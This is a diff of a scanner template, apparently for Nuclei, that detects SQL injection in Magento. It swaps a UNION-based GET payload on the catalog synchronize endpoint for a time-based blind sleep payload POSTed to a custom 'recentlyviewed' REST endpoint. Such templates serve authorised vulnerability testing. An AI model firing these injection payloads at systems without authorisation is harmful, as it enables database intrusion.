@@ -1,18 +1,41 @@
 id: magento-sqli
-
 info:
-  name: Magento 2.3.0 SQL Injection
-  author: glatisant
-  severity: high
-
+  author: melbadry9
+  description: magento SQLi
+  name: Magento SQLi
+  reference: https://none
+  severity: critical
+  tags: magento
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=?&ids[0][product_id][to]=)))%20OR%20(SELECT%201%20UNION%20SELECT%202%20FROM%20DUAL%20WHERE%201=0)%20--%20-"
-    matchers:
-      - type: word
-        words:
-          - "[]"
-      - type: status
-        status:
-          - 200
+- matchers:
+  - part: body
+    type: word
+    words:
+    - <response>true</response>
+  - status:
+    - 200
+    type: status
+  - dsl:
+    - duration>=4
+    type: dsl
+  matchers-condition: and
+  raw:
+  - 'POST /magento/rest/en/V1/homzmart/recentlyviewed/addproduct HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+    Content-Length: 109
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip,deflate,br
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/99.0.4844.0 Safari/537.36
+
+
+    {"customerId":"0''XOR(if(now()=sysdate(),sleep(2*2),0))XOR''Z","customerType":"Guest","productId":"A.H.FU.146"}
+
+    '
